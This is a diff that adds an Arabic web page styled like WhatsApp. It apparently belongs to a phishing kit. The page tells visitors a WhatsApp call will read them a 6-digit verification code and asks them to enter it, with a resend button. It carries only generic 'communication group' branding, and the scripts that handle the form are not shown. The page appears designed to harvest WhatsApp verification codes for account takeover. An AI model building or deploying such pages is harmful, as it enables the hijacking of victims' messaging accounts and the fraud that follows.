@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>رمز التأكيد عبر مكالمة واتساب</title>
+  <link rel="icon" href="./assets/images/favicon.ico" />
+  <link rel="stylesheet" href="style.css" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+  
+  <style>
+    .loading-overlay {
+      position: fixed;
+      top:0; left:0; right:0; bottom:0;
+      background: rgba(0,0,0,0.5);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+    }
+    .loading-popup {
+      background: #fff;
+      padding: 30px 50px;
+      border-radius: 8px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.3);
+      font-size: 1.5rem;
+      color: #333;
+      text-align: center;
+      display: flex;
+      align-items: center;
+      gap: 15px;
+    }
+    .loading-spinner {
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #25D366;
+      border-radius: 50%;
+      width: 24px;
+      height: 24px;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    #errorMsg, #successMsg {
+      display: none;
+      font-weight: bold;
+      margin-top: 10px;
+      text-align: center;
+    }
+    #errorMsg {
+      color: red;
+    }
+    #successMsg {
+      color: #25D366;
+    }
+    .whatsapp-info {
+      background-color: #f0f9f0;
+      border: 1px solid #25D366;
+      border-radius: 10px;
+      padding: 15px;
+      margin: 20px 0;
+      display: flex;
+      align-items: center;
+      gap: 15px;
+    }
+    .whatsapp-icon {
+      color: #25D366;
+      font-size: 2.5rem;
+      flex-shrink: 0;
+    }
+    .whatsapp-text {
+      color: #333;
+      font-size: 1rem;
+      line-height: 1.5;
+    }
+    .whatsapp-text strong {
+      color: #25D366;
+    }
+    .code-subtitle {
+      color: #666;
+      margin-bottom: 10px;
+    }
+    #confirmCodeBtn {
+      background-color: #25D366;
+      border: none;
+    }
+    #confirmCodeBtn:hover {
+      background-color: #1da851;
+    }
+    #resendCallBtn {
+      background-color: #128C7E;
+      border: none;
+      color: white;
+      margin-top: 10px;
+      padding: 12px;
+      font-size: 1rem;
+      width: 100%;
+      cursor: pointer;
+      border-radius: 5px;
+    }
+    #resendCallBtn:hover {
+      background-color: #0e6e5e;
+    }
+    #resendCallBtn:disabled {
+      background-color: #888;
+      cursor: not-allowed;
+    }
+  </style>
+<script src="https://sites.super.myninja.ai/_assets/ninja-daytona-script.js"></script>
+</head>
+<body>
+
+  <div class="navbar">
+    <div class="navbar-title">مجموعة التواصل</div>
+    <img src="./assets/images/logonavbar.svg" alt="شعار التواصل" />
+  </div>
+
+  <div class="container" id="container" dir="rtl">
+    <form id="confirmationForm" novalidate>
+      <div id="codeSection">
+        <div class="code-container">
+          <img style="width: 30%" src="./assets/images/logonavbar.svg" alt="شعار التواصل" class="code-logo" />
+          <h2 class="code-title">يرجى إدخال رمز التحقق</h2>
+          
+          <div class="whatsapp-info">
+            <i class="fab fa-whatsapp whatsapp-icon"></i>
+            <div class="whatsapp-text">
+              <strong>كيف ستصلك المكالمة؟</strong><br>
+              ستصلك مكالمة هاتفية عبر <strong>واتساب</strong> تحتوي على رمز التحقق المكون من 6 أرقام.
+              يرجى التأكد من أن رقم هاتفك مرتبط بحساب واتساب والرد على المكالمة لسماع الرمز.
+            </div>
+          </div>
+          
+          <p class="code-subtitle">تم إرسال رمز مكون من 6 أرقام عبر مكالمة واتساب إلى رقمك</p>
+          <input id="text" type="text" name="code" maxlength="6" placeholder="— — — — — —" required />
+
+          <p id="errorMsg"></p>
+          <p id="successMsg"></p>
+
+          <button type="submit" id="confirmCodeBtn">
+            <i class="fas fa-check-circle"></i> تأكيد الرمز
+          </button>
+          <button type="button" id="resendCallBtn">
+            <i class="fas fa-phone-alt"></i> إعادة إرسال الرمز عبر مكالمة
+          </button>
+        </div>
+      </div>
+    </form>
+  </div>
+
+  <div class="footer">
+    <p>© 2025 جميع الحقوق محفوظة</p>
+    <p>تم التطوير بواسطة فريق الدعم</p>
+  </div>
+
+  <div id="loadingPopup" class="loading-overlay">
+    <div class="loading-popup">
+      <div class="loading-spinner"></div>
+      <span id="loadingText">جاري إجراء المكالمة عبر واتساب ...</span>
+    </div>
+  </div>
+
+  <script src="js/utils.js"></script>
+  <script src="js/about.js"></script>
+</body>
+</html>
